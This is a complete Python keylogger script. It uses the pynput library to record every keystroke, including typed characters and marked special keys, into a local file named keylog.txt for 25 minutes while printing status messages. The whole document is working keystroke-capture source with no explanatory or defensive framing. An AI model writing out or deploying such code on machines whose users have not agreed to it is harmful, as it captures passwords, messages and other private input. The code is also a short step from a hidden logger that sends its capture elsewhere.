from pynput.keyboard import Key, Listener
import time

# File to save logs
log_file = "keylog.txt"
buffer = ""

# Set runtime in seconds
RUN_TIME = 1500
start_time = time.time()

def on_press(key):
    global buffer

    try:
        if key == Key.space:
            buffer += " "
        elif key == Key.enter:
            buffer += "\n"
        elif key == Key.backspace:
            buffer = buffer[:-1]
        elif key in [Key.shift, Key.ctrl_l, Key.ctrl_r, Key.alt, Key.alt_gr, Key.esc, Key.tab, Key.caps_lock]:
            pass  # Ignore special keys
        elif hasattr(key, 'char') and key.char is not None:
            buffer += key.char
        else:
            buffer += f"[{key.name}]"
    except:
        pass

    # Save buffer to file
    with open(log_file, "w", encoding='utf-8') as f:
        f.write(buffer)

    # Stop after RUN_TIME seconds
    if time.time() - start_time > RUN_TIME:
        print(f"\n[INFO] Keylogger stopped after {RUN_TIME} seconds.")
        return False  # Stops the listener

# Start listener
with Listener(on_press=on_press) as listener:
    print(f"[INFO] Keylogger running for {RUN_TIME} seconds... Press keys now.")
    listener.join()

print("[INFO] Log saved to", log_file)
